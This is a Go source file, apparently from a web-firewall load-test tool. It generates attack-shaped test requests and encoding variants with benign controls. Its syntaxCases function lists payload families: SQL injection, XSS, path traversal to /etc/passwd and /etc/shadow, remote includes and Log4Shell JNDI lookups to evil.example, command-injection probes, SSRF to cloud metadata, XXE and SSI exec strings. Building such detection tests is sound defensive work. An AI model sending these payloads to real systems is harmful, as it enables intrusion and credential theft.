// SPDX-License-Identifier: Apache-2.0

package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"unicode/utf16"
)

// wireFingerprint excludes the measurement ID and socket destination. It hashes
// the constructed method, Host, wire target, explicit headers and actual body,
// including reconstructed multipart bytes. It does not claim TCP-byte identity.
func wireFingerprint(req *http.Request) (string, error) {
	headers := req.Header.Clone()
	headers.Del("X-Loadtest-Case")
	var body []byte
	if req.GetBody != nil {
		reader, err := req.GetBody()
		if err != nil {
			return "", err
		}
		body, err = io.ReadAll(reader)
		closeErr := reader.Close()
		if err != nil {
			return "", err
		}
		if closeErr != nil {
			return "", closeErr
		}
	}
	data, err := json.Marshal(struct {
		Method, Host, Target string
		Headers              http.Header
		Body                 []byte
	}{req.Method, req.Host, req.URL.RequestURI(), headers, body})
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%x", sha256.Sum256(data)), nil
}

// queryVariant preserves decoded names/values and their order/multiplicity. Raw
// semicolon and malformed-escape probes are left alone rather than repaired.
func queryVariant(query, style string) (string, bool) {
	if strings.Contains(query, ";") {
		return "", false
	}
	encode := func(value string) string {
		var b strings.Builder
		for _, c := range []byte(value) {
			if style == "lower-hex" {
				fmt.Fprintf(&b, "%%%02x", c)
			} else {
				fmt.Fprintf(&b, "%%%02X", c)
			}
		}
		return b.String()
	}
	parts := strings.Split(query, "&")
	for i, part := range parts {
		name, value, hasEquals := strings.Cut(part, "=")
		decodedName, err := url.QueryUnescape(name)
		if err != nil {
			return "", false
		}
		decodedValue, err := url.QueryUnescape(value)
		if err != nil {
			return "", false
		}
		switch style {
		case "encoded-name":
			name = encode(decodedName)
		case "encoded-value":
			value = encode(decodedValue)
		case "encoded-both", "lower-hex":
			name, value = encode(decodedName), encode(decodedValue)
		case "percent-space", "plus-space":
			name, value = url.QueryEscape(decodedName), url.QueryEscape(decodedValue)
			if style == "percent-space" {
				name, value = strings.ReplaceAll(name, "+", "%20"), strings.ReplaceAll(value, "+", "%20")
			}
		}
		parts[i] = name
		if hasEquals {
			parts[i] += "=" + value
		}
	}
	return strings.Join(parts, "&"), true
}

func variedCases(seeds []testCase) ([]testCase, error) {
	var out []testCase
	seen := map[string]bool{}
	add := func(parent testCase, label string, req request) error {
		c := testCase{
			Name:   strings.SplitN(parent.Name, "/", 2)[0] + fmt.Sprintf("/variant-%05d", len(out)),
			Attack: parent.Attack, Request: req, Parent: parent.Name, Variation: label,
			Description: parent.Description,
		}
		prepared, err := prepare(c, "http://127.0.0.1:1", 0)
		if err != nil {
			return fmt.Errorf("%s %s: %w", parent.Name, label, err)
		}
		key, err := wireFingerprint(prepared)
		if err != nil {
			return err
		}
		if !seen[key] {
			seen[key] = true
			out = append(out, c)
		}
		return nil
	}
	for _, c := range seeds {
		prepared, err := prepare(c, "http://127.0.0.1:1", 0)
		if err != nil {
			return nil, err
		}
		key, err := wireFingerprint(prepared)
		if err != nil {
			return nil, err
		}
		seen[key] = true
	}
	clone := func(req request) request {
		headers := map[string]string{}
		for k, v := range req.Headers {
			headers[k] = v
		}
		req.Headers = headers
		req.Files = append(req.Files[:0:0], req.Files...)
		return req
	}
	jsonStrings := regexp.MustCompile("\"(?:[^\"\\\\]|\\\\.)*\"")
	unicodeString := func(value string) string {
		var b strings.Builder
		b.WriteByte('"')
		for _, c := range value {
			if c > 0xffff {
				hi, lo := utf16.EncodeRune(c)
				fmt.Fprintf(&b, "\\u%04x\\u%04x", hi, lo)
			} else {
				fmt.Fprintf(&b, "\\u%04x", c)
			}
		}
		b.WriteByte('"')
		return b.String()
	}
	for _, c := range seeds {
		category := strings.SplitN(c.Name, "/", 2)[0]
		path, query, hasQuery := strings.Cut(c.Request.URI, "?")
		for _, style := range []string{"encoded-name", "encoded-value", "encoded-both", "lower-hex", "percent-space", "plus-space"} {
			if hasQuery {
				if q, ok := queryVariant(query, style); ok {
					req := clone(c.Request)
					req.URI = path + "?" + q
					if err := add(c, "query-"+style, req); err != nil {
						return nil, err
					}
				}
			}
			ct := http.Header{}
			for k, v := range c.Request.Headers {
				ct.Set(k, v)
			}
			if strings.HasPrefix(ct.Get("Content-Type"), "application/x-www-form-urlencoded") {
				if body, ok := queryVariant(c.Request.Body, style); ok {
					req := clone(c.Request)
					req.Body = body
					if err := add(c, "form-"+style, req); err != nil {
						return nil, err
					}
				}
			}
		}
		// Preserve duplicate keys and decoded strings instead of mapping JSON.
		if json.Valid([]byte(c.Request.Body)) {
			req := clone(c.Request)
			req.Body = jsonStrings.ReplaceAllStringFunc(req.Body, func(token string) string {
				var decoded string
				if err := json.Unmarshal([]byte(token), &decoded); err != nil {
					return token
				}
				return unicodeString(decoded)
			})
			if !json.Valid([]byte(req.Body)) {
				return nil, fmt.Errorf("%s: invalid Unicode JSON variant", c.Name)
			}
			if err := add(c, "json-unicode-strings", req); err != nil {
				return nil, err
			}
			for _, indent := range []string{" ", "\t"} {
				var body bytes.Buffer
				if err := json.Indent(&body, []byte(c.Request.Body), "", indent); err != nil {
					return nil, err
				}
				req := clone(c.Request)
				req.Body = body.String()
				if err := add(c, "json-layout-"+fmt.Sprintf("%x", indent), req); err != nil {
					return nil, err
				}
			}
		}
		if strings.HasPrefix(c.Request.Body, "<input>") {
			var input struct {
				Value string `xml:",chardata"`
			}
			if err := xml.Unmarshal([]byte(c.Request.Body), &input); err != nil {
				return nil, err
			}
			var text strings.Builder
			for _, ch := range input.Value {
				fmt.Fprintf(&text, "&#x%X;", ch)
			}
			req := clone(c.Request)
			req.Body = "<input>" + text.String() + "</input>"
			if err := add(c, "xml-character-references", req); err != nil {
				return nil, err
			}
		}
		if category == "probe" || category == "wordpress" || category == "protocol" {
			for _, prefix := range []string{"/./", "//", "/%2e/"} {
				req := clone(c.Request)
				req.URI = prefix + strings.TrimPrefix(c.Request.URI, "/")
				if err := add(c, "path-normalization-"+prefix, req); err != nil {
					return nil, err
				}
			}
		}
		if category == "upload" {
			for _, suffix := range []string{".jpg", ".png", ".txt"} {
				req := clone(c.Request)
				for i := range req.Files {
					// Renaming a reserved config file can remove its dangerous
					// interpretation; do not count that as an attack variant.
					if req.Files[i].Name != ".htaccess" && !strings.EqualFold(req.Files[i].Name, "web.config") {
						req.Files[i].Name += suffix
					}
				}
				if err := add(c, "upload-double-extension-"+suffix, req); err != nil {
					return nil, err
				}
			}
		}
	}
	return out, nil
}

// syntaxCases changes payload syntax as well as its surrounding transport.
// Every fixture is a conditional indicator; the origin has no unsafe sink.
func syntaxCases() []testCase {
	var out []testCase
	add := func(cat, label string, req request, attack bool) {
		out = append(out, testCase{Name: cat + fmt.Sprintf("/syntax-%04d", len(out)), Attack: attack, Request: req, Variation: "syntax-" + label, Parent: cat + "/syntax-family", Description: "synthetic syntax variant; application interpretation is required for impact"})
	}
	for _, family := range []struct {
		category string
		payloads []string
	}{
		{"sqli", []string{"1 OR 2=2-- ", "1\tOR\t3=3-- ", "1/**/OR/**/4=4-- ", "1 oR 5=5-- ", "' OR 'a'='a'-- ", "1 UNION ALL SELECT NULL-- ", "1/**/UNION/**/SELECT/**/NULL-- ", "1 AND (2>1)-- "}},
		{"xss", []string{"<script>confirm(1)</script>", "<ScRiPt>alert(2)</ScRiPt>", "<img src=x onerror=alert(3)>", "<img\tsrc=x\tonerror=alert(4)>", "<svg onload=confirm(5)>", "<svg/onload=alert(6)>", "<details open ontoggle=alert(7)>", "<a href=\"javascript:alert(8)\">test</a>", "<img src=x onerror=\"&#97;lert(9)\">"}},
		{"lfi", []string{"../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/shadow", "..\\..\\windows\\win.ini", "....//....//etc/passwd", "..%2f..%2fetc%2fpasswd", "%252e%252e%252fetc%252fpasswd"}},
		{"rfi", []string{"http://evil.example/loadtest.php", "https://evil.example/loadtest.txt", "ftp://evil.example/loadtest.php", "//evil.example/loadtest.php", "http://evil.example:8080/loadtest.php", "https://evil.example/loadtest.php?x=1"}},
		{"rce", []string{";id", "&& id", "| id", "$(id)", "; i''d", "; /usr/bin/id", "; echo LOADTEST", "cmd.exe /c echo LOADTEST", "powershell -NoProfile -Command Write-Output LOADTEST"}},
		{"php", []string{"<?php echo 1; ?>", "<?php\n echo 2;\n?>", "<?php /*test*/ echo 3; ?>", "<?php system('id'); ?>", "phpinfo()", "system('id')", "assert('1==1')", "eval('echo 1;')"}},
		{"java", []string{"${jndi:ldap://evil.example/test}", "${jndi:rmi://evil.example/test}", "${jndi:dns://evil.example/test}", "${${lower:j}ndi:ldap://evil.example/test}", "${jndi:${lower:l}dap://evil.example/test}", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH", "aced00057372"}},
		{"ssrf", []string{"http://127.0.0.1/", "http://127.1/", "http://2130706433/", "http://0x7f000001/", "http://[::1]/", "http://example.com@127.0.0.1/", "http://169.254.169.254/latest/meta-data/", "dict://127.0.0.1:11211/stats"}},
		{"ssti", []string{"{{7*7}}", "{{ 7 * 7 }}", "{{\t7*7\t}}", "${7*7}", "${ 7 * 7 }", "#{7*7}", "<%= 7*7 %>", "*{7*7}", "{{config}}"}},
		{"ldap", []string{"*)(|(uid=*))", "*)(|(cn=*))", "*)(|(mail=*))", "*)(|(objectClass=*))", "admin)(|(userPassword=*))", "*)(!(uid=missing))", "*)(uid=*))(&(cn=*", "*)(|(sn=*)(givenName=*))"}},
		{"xpath", []string{"' or true() or 'a'='b", "'\tor\ttrue()\tor\t'a'='b", "' or (true()) or 'a'='b", "' or count(//user)>=1 or 'a'='b", "' or contains(name(), 'user') or 'a'='b", "' or not(false()) or 'a'='b", "']|//user|//*['a'='a", "' or position() = 1 or 'a'='b"}},
		{"ssi", []string{"<!--#exec cmd=\"echo LOADTEST\"-->", "<!--#exec\tcmd=\"echo LOADTEST\" -->", "<!--#exec cmd='echo LOADTEST' -->", "<!--#include virtual='/loadtest.txt' -->", "<!--#echo var='DOCUMENT_ROOT' -->", "<!--#printenv-->", "<!--#include file='../loadtest.txt' -->"}},
	} {
		for i, payload := range family.payloads {
			endpoint := "/api/loadtest/" + family.category
			encoded := url.QueryEscape(payload)
			add(family.category, fmt.Sprintf("%02d-query", i), request{Method: "GET", URI: endpoint + "?input=" + encoded}, true)
			add(family.category, fmt.Sprintf("%02d-form", i), request{Method: "POST", URI: endpoint, Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, Body: "input=" + encoded}, true)
			body, _ := json.Marshal(map[string]string{"input": payload})
			add(family.category, fmt.Sprintf("%02d-json", i), request{Method: "POST", URI: endpoint, Headers: map[string]string{"Content-Type": "application/json"}, Body: string(body)}, true)
		}
		add(family.category, "control-query", request{Method: "GET", URI: "/api/loadtest/" + family.category + "?input=ordinary+sample"}, false)
		add(family.category, "control-json", request{Method: "POST", URI: "/api/loadtest/" + family.category, Headers: map[string]string{"Content-Type": "application/json"}, Body: "{\"input\":\"ordinary sample\"}"}, false)
	}
	for i := 0; i < 8; i++ {
		for _, ct := range []string{"application/xml", "text/xml"} {
			for _, quote := range []string{"\"", "'"} {
				body := fmt.Sprintf("<?xml version=%s1.0%s?>\n<!DOCTYPE root [<!ENTITY e%d SYSTEM %sfile:///etc/passwd%s>]><root>&e%d;</root>", quote, quote, i, quote, quote, i)
				add("xxe", "entity-quote-name", request{Method: "POST", URI: "/api/xml", Headers: map[string]string{"Content-Type": ct}, Body: body}, true)
			}
		}
		add("scanner", "user-agent-version", request{Method: "GET", URI: "/", Headers: map[string]string{"User-Agent": fmt.Sprintf("sqlmap/1.%d", i)}}, true)
		add("scanner", "user-agent-nikto", request{Method: "GET", URI: "/", Headers: map[string]string{"User-Agent": fmt.Sprintf("Nikto/2.%d", i)}}, true)
		add("nosql", "operator-nesting", request{Method: "POST", URI: "/api/login", Headers: map[string]string{"Content-Type": "application/json"}, Body: fmt.Sprintf("{\"filter\":{\"$or\":[{\"role\":{\"$ne\":\"guest%d\"}},{\"username\":{\"$regex\":\"^admin\"}}]}}", i)}, true)
		add("hpp", "split-boolean", request{Method: "GET", URI: fmt.Sprintf("/api/update?id=%d&id=%d%%27+OR+%%271%%27=%%271", i+1, i+2)}, true)
		add("hpp", "scalar-array-clash", request{Method: "POST", URI: "/api/update", Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, Body: fmt.Sprintf("role[%d]=user&role=admin", i)}, true)
		add("prototype", "nested-path", request{Method: "GET", URI: fmt.Sprintf("/api/settings?items[%d][constructor][prototype][loadtest]=1", i)}, true)
	}
	for _, path := range []string{"/actuator/env", "/actuator/configprops", "/.env", "/.git/config", "/adminer.php", "/server-status", "/phpmyadmin/", "/debug/vars"} {
		add("probe", "diagnostic-path", request{Method: "GET", URI: path}, true)
	}
	for _, path := range []string{"/wp-content/uploads/test.php", "/wp-content/uploads/test.phtml", "/wp-content/cache/test.php", "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", "/wp-content/plugins/revslider/temp/update_extract/revslider/shell.php"} {
		add("wordpress", "plugin-upload-path", request{Method: "GET", URI: path}, true)
	}
	for _, method := range []string{"TRACE", "TRACK", "trace", "TrAcE", "CONNECT"} {
		add("protocol", "method-token", request{Method: method, URI: "/"}, true)
	}
	return out
}
